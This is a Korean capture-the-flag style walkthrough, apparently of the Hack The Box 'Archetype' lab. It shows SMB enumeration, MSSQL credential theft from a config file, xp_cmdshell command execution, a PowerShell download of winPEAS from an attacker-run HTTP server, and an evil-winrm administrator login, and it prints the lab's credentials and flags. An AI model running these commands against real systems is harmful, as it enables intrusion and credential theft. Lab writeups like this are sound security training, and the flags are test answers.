---
title: "Hack The Box - Archetype Writeup"
date: 2026-03-30T09:09:00+09:00
categories:
  - Web Hacking
tags:
  - Hack The Box
  - Tier 2
  - Archetype
  - SMB
  - MSSQL
  - WinRM
last_modified_at: 2026-03-30T09:09:00+09:00
published: true
---
## 개요

Archetype은 공개 SMB 공유에서 MSSQL 접속 정보를 회수하고, `xp_cmdshell`로 OS 명령 실행을 확보한 뒤, PowerShell 기록에서 관리자 자격 증명을 찾아 WinRM으로 마무리하는 문제

흐름은 비교적 단순하다

- SMB 익명 열거
- 설정 파일에서 MSSQL 계정 회수
- MSSQL 접속 후 `xp_cmdshell` 활성화
- `winPEAS`로 권한 상승 단서 수집
- PowerShell 기록에서 관리자 비밀번호 회수
- WinRM으로 `Administrator` 접속

## 1. 정보 수집과 표면 분석

열린 서비스 식별 단계

```bash
nmap -sC -sV -p- --min-rate 5000 -T5 10.129.57.175
```

- `-sC`: 기본 NSE 스크립트 실행
- `-sV`: 서비스 버전 식별
- `-p-`: 전체 TCP 포트 스캔
- `--min-rate 5000`: 초당 최소 5000개 수준으로 전송
- `-T5`: 매우 공격적인 타이밍 템플릿

출력 확인 포인트: 포트 번호, 서비스 이름, 다음 단계 후보

```text
135/tcp   open  msrpc
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
```

여기서 바로 이어지는 판단은 다음과 같다

- `445/tcp`는 SMB 공유 열거 후보
- `1433/tcp`는 MSSQL 접속 후보
- `5985/tcp`는 WinRM 원격 셸 후보

## 2. SMB 열거와 자격 증명 확보

공개 자원 확인과 자격 증명 수집 단계

우선 확인: 익명 공유 목록

```bash
smbclient -N -L //10.129.57.175/
```

- `-N`: 비밀번호 없이 접속 시도
- `-L`: 공유 목록 조회

핵심 출력: 공유 이름

```text
Sharename       Type
---------       ----
ADMIN$          Disk
backups         Disk
C$              Disk
IPC$            IPC
```

`$`가 붙지 않은 `backups`가 일반 사용자용 공유로 보임

이후 실제 공유 접속

```bash
smbclient -N //10.129.57.175/backups
```

접속 후에는 원격 디렉터리와 파일 확인

```text
smb: \> dir
  prod.dtsConfig                     AR      609
```

파일을 내려받아 내용 확인

```text
smb: \> get prod.dtsConfig
```

```bash
cat prod.dtsConfig
```

핵심 내용은 연결 문자열 안에 있다

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
```

여기서 확보한 값

- 계정 `ARCHETYPE\sql_svc`
- 비밀번호 `M3g4c0rp123`

## 3. MSSQL 접속과 명령 실행

초기 진입 이후 내부 명령 실행 단계

획득한 계정으로 MSSQL에 붙는다

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.57.175 -windows-auth
```

- `ARCHETYPE/sql_svc:...@IP`: 도메인, 계정, 비밀번호, 대상 IP 지정
- `-windows-auth`: SQL 계정 인증이 아니라 Windows 인증 사용

정상 접속되면 아래처럼 프롬프트가 생긴다

```text
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

먼저 현재 사용자와 권한 수준 확인

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

출력 핵심: 현재 계정, `sysadmin` 여부

```text
ARCHETYPE\sql_svc
1
```

`1`이면 `sysadmin` 권한
`xp_cmdshell` 활성화 가능

```text
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami';
```

출력 핵심: 실제 OS 명령 실행 계정

```text
output
-----------------
archetype\sql_svc
```

이 시점부터 MSSQL을 통해 Windows 명령 실행이 가능

## 4. 내부 정찰과 권한 상승 단서 수집

권한 상승 경로 탐색 단계

Windows 권한 상승 후보를 빠르게 찾기 위해 `winPEAS` 전달

공격자 쪽 임시 HTTP 서버 선실행

```bash
python3 -m http.server 8000
```

- `-m http.server`: 파이썬 내장 HTTP 서버 모듈 실행
- `8000`: 서비스 포트

대상에서는 PowerShell로 파일을 내려받는다

```sql
EXEC xp_cmdshell 'powershell -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.15.92:8000/winPEASx64.exe'',''C:\Users\sql_svc\Desktop\winPEAS.exe'')"';
```

다운로드가 되었는지 확인

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop\winPEAS.exe';
```

핵심 출력은 파일 경로와 크기다

```text
Directory of C:\Users\sql_svc\Desktop
03/27/2026  02:28 AM        10,170,880 winPEAS.exe
```

실행 결과를 파일로 저장한 뒤, 자격 증명 관련 키워드만 추린다

```sql
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\winPEAS.exe > C:\Users\sql_svc\Desktop\peas.txt';
EXEC xp_cmdshell 'findstr /i "pass cred history auto consolehost" C:\Users\sql_svc\Desktop\peas.txt';
```

- `findstr`: Windows 문자열 검색 도구
- `/i`: 대소문자 구분 없이 검색

여기서 바로 봐야 할 줄은 PowerShell 기록 파일 경로다

```text
PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

해당 파일을 읽는다

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

- `type`: Windows에서 파일 내용 출력

핵심 출력

```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

여기서 확보한 값

- 계정 `administrator`
- 비밀번호 `MEGACORP_4dm1n!!`

## 5. 사용자 플래그 확인

초기 권한 기준 접근 가능한 민감 파일 확인 단계

현재 계정의 바탕화면 확인

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
```

출력 핵심

```text
02/25/2020  07:37 AM                32 user.txt
3e7b102e78218e935bf3f4951fec21a3
```

사용자 플래그

```text
3e7b102e78218e935bf3f4951fec21a3
```

## 6. WinRM 접속과 최종 권한 확보

획득한 관리자 자격 증명 재사용 단계

`5985/tcp`가 열려 있으므로 WinRM으로 바 접속

```bash
evil-winrm -i 10.129.57.175 -u administrator -p 'MEGACORP_4dm1n!!'
```

- `-i`: 대상 IP 지정
- `-u`: 사용자명 지정
- `-p`: 비밀번호 지정

셸 해석 방지: 작은따옴표

정상 접속되면 PowerShell 프롬프트가 열림

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

관리자 바탕화면으로 이동해 플래그 확인

```powershell
cd C:\Users\Administrator\Desktop
ls
type root.txt
```

핵심 출력

```text
-ar---        2/25/2020   6:36 AM             32 root.txt
b91ccec3305e98240082d4474b848528
```

루트 플래그

```text
b91ccec3305e98240082d4474b848528
```

## 정리

핵심: 공개 SMB 공유 하나가 윈도우 전체 장악 출발점

- 익명 SMB 공유에서 설정 파일 회수
- 설정 파일에서 MSSQL 자격 증명 확보
- `xp_cmdshell`로 OS 명령 실행
- PowerShell 기록에서 관리자 비밀번호 회수
- WinRM으로 최종 관리자 접근

서비스가 많이 열려 있어도, 실제 시작점은 가장 약한 공개 자원 하나라는 점이 잘 드러나는 문제
